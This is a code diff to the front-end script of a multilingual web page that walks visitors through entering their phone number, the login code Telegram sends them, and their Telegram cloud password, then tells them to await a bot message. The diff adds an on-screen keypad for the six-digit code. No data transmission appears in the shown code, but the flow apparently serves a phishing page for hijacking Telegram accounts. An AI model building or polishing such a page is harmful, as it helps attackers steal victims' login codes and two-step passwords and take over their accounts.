@@ -14,7 +14,6 @@ const translations = {
         step2: "Step 2 of 3",
         codeTitle: "Verification Code",
         codeDesc: "Enter the confirmation code sent to Telegram",
-        codeLabel: "Confirmation Code",
         btnVerifyCode: "Verify Code",
         step3: "Step 3 of 3",
         passTitle: "Cloud Password",
@@ -26,7 +25,7 @@ const translations = {
         successP2: "Please wait for a message from the bot.",
         btnHome: "Main Page",
         errPhone: "Please enter a valid phone number",
-        errCode: "Please enter the 6-digit code",
+        errCode: "Please enter all 6 digits of the code",
         errPass: "Please enter your cloud password"
     },
     ru: {
@@ -43,7 +42,6 @@ const translations = {
         step2: "Шаг 2 из 3",
         codeTitle: "Подтверждение",
         codeDesc: "Введите код, который был отправлен в Telegram",
-        codeLabel: "Код подтверждения",
         btnVerifyCode: "Проверить код",
         step3: "Шаг 3 из 3",
         passTitle: "Облачный пароль",
@@ -55,7 +53,7 @@ const translations = {
         successP2: "Ожидайте сообщение от бота.",
         btnHome: "На главную",
         errPhone: "Пожалуйста, введите корректный номер телефона",
-        errCode: "Введите 6-значный код",
+        errCode: "Введите все 6 цифр кода",
         errPass: "Введите облачный пароль"
     },
     ar: {
@@ -72,7 +70,6 @@ const translations = {
         step2: "الخطوة 2 من 3",
         codeTitle: "رمز التأكيد",
         codeDesc: "أدخل الرمز المرسل إلى التليجرام",
-        codeLabel: "رمز التحقق",
         btnVerifyCode: "التحقق من الرمز",
         step3: "الخطوة 3 من 3",
         passTitle: "كلمة المرور السحابية",
@@ -84,7 +81,7 @@ const translations = {
         successP2: "يرجى انتظار رسالة من البوت.",
         btnHome: "الصفحة الرئيسية",
         errPhone: "يرجى إدخال رقم هاتف صحيح",
-        errCode: "يرجى إدخال الرمز المكون من 6 أرقام",
+        errCode: "يرجى إدخال جميع الأرقام الـ 6",
         errPass: "يرجى إدخال كلمة المرور السحابية"
     },
     iq: {
@@ -101,7 +98,6 @@ const translations = {
         step2: "الخطوة 2 من 3",
         codeTitle: "كود التاكيد",
         codeDesc: "اكتب الكود اللي وصلك على التليجرام",
-        codeLabel: "كود التحقق",
         btnVerifyCode: "افحص الكود",
         step3: "الخطوة 3 من 3",
         passTitle: "الباسورد الغيمي",
@@ -113,7 +109,7 @@ const translations = {
         successP2: "انتظر رسالة من البوت.",
         btnHome: "للصفحة الرئيسية",
         errPhone: "الرجاء كتابة رقم تليفون صحيح",
-        errCode: "اكتب الكود المتكون من 6 ارقام",
+        errCode: "اكتب الكود الكرامه متكون من 6 ارقام",
         errPass: "اكتب الباسورد الغيمي"
     },
     fa: {
@@ -130,7 +126,6 @@ const translations = {
         step2: "مرحله ۲ از ۳",
         codeTitle: "کد تایید",
         codeDesc: "کد ارسال شده به تلگرام را وارد کنید",
-        codeLabel: "کد تأیید",
         btnVerifyCode: "تایید کد",
         step3: "مرحله ۳ از ۳",
         passTitle: "رمز عبور ابری",
@@ -142,14 +137,15 @@ const translations = {
         successP2: "لطفا منتظر پیام ربات باشید.",
         btnHome: "صفحه اصلی",
         errPhone: "لطفا یک شماره تلفن معتبر وارد کنید",
-        errCode: "لطفا کد ۶ رقمی را وارد کنید",
+        errCode: "لطفا کد ۶ رقمی را به طور کامل وارد کنید",
         errPass: "لطفا رمز عبور ابری را وارد کنید"
     }
 };
 
 let currentLang = 'en';
+let currentCode = '';
 
-// ===== NAVIGATION & UI SWITCHING =====
+// ===== NAVIGATION & UI =====
 function showPage(pageId) {
     document.querySelectorAll('.page').forEach(page => {
         page.classList.remove('active');
@@ -161,14 +157,12 @@ function setLanguage(lang) {
     currentLang = lang;
     const dict = translations[lang] || translations.en;
     
-    // Toggle RTL direction for Arabic, Iraqi, and Persian
     if (['ar', 'iq', 'fa'].includes(lang)) {
         document.documentElement.setAttribute('dir', 'rtl');
     } else {
         document.documentElement.setAttribute('dir', 'ltr');
     }
 
-    // Replace text content
     document.querySelectorAll('[data-i18n]').forEach(el => {
         const key = el.getAttribute('data-i18n');
         if (dict[key]) {
@@ -177,24 +171,73 @@ function setLanguage(lang) {
     });
 }
 
+// ===== PINPAD LOGIC =====
+function updatePinDisplay() {
+    const dots = document.querySelectorAll('.pin-dot');
+    const hiddenInput = document.getElementById('codeInput');
+    hiddenInput.value = currentCode;
+
+    dots.forEach((dot, index) => {
+        if (index < currentCode.length) {
+            dot.textContent = currentCode[index];
+            dot.classList.add('filled');
+            dot.classList.remove('active');
+        } else if (index === currentCode.length) {
+            dot.textContent = '';
+            dot.classList.add('active');
+            dot.classList.remove('filled');
+        } else {
+            dot.textContent = '';
+            dot.classList.remove('filled', 'active');
+        }
+    });
+}
+
 // ===== EVENT LISTENERS =====
 document.addEventListener('DOMContentLoaded', () => {
 
-    // Language switcher event
+    // Language switcher
     const langSelect = document.getElementById('langSelect');
     langSelect.addEventListener('change', (e) => {
         setLanguage(e.target.value);
     });
 
-    // Navigation buttons
+    // Navigation
     document.getElementById('btnGetStarted').addEventListener('click', () => showPage('page-phone'));
     document.getElementById('btnBackFromPhone').addEventListener('click', () => showPage('page-main'));
     document.getElementById('btnBackFromCode').addEventListener('click', () => showPage('page-phone'));
     document.getElementById('btnBackFromPassword').addEventListener('click', () => showPage('page-code'));
-    document.getElementById('btnReset').addEventListener('click', () => showPage('page-main'));
+    document.getElementById('btnReset').addEventListener('click', () => {
+        currentCode = '';
+        updatePinDisplay();
+        showPage('page-main');
+    });
+
+    // Keypad handlers
+    document.querySelectorAll('.keypad-btn[data-val]').forEach(btn => {
+        btn.addEventListener('click', () => {
+            if (currentCode.length < 6) {
+                currentCode += btn.getAttribute('data-val');
+                updatePinDisplay();
+                document.getElementById('codeError').textContent = '';
+            }
+        });
+    });
+
+    document.getElementById('keypadDelete').addEventListener('click', () => {
+        if (currentCode.length > 0) {
+            currentCode = currentCode.slice(0, -1);
+            updatePinDisplay();
+        }
+    });
+
+    document.getElementById('keypadClear').addEventListener('click', () => {
+        currentCode = '';
+        updatePinDisplay();
+    });
 
     // Form 1: Phone
-    document.getElementById('form-phone').addEventListener('submit', async (e) => {
+    document.getElementById('form-phone').addEventListener('submit', (e) => {
         e.preventDefault();
         const phone = document.getElementById('phoneInput').value.trim();
         const errorEl = document.getElementById('phoneError');
@@ -208,12 +251,11 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // Form 2: Code
-    document.getElementById('form-code').addEventListener('submit', async (e) => {
+    document.getElementById('form-code').addEventListener('submit', (e) => {
         e.preventDefault();
-        const code = document.getElementById('codeInput').value.trim();
         const errorEl = document.getElementById('codeError');
 
-        if (!code || code.length < 5) {
+        if (currentCode.length !== 6) {
             errorEl.textContent = translations[currentLang].errCode;
             return;
         }
@@ -222,7 +264,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // Form 3: Password
-    document.getElementById('form-password').addEventListener('submit', async (e) => {
+    document.getElementById('form-password').addEventListener('submit', (e) => {
         e.preventDefault();
         const pass = document.getElementById('passwordInput').value.trim();
         const errorEl = document.getElementById('passwordError');
@@ -234,4 +276,7 @@ document.addEventListener('DOMContentLoaded', () => {
         errorEl.textContent = '';
         showPage('page-success');
     });
+
+    // Initial state
+    updatePinDisplay();
 });
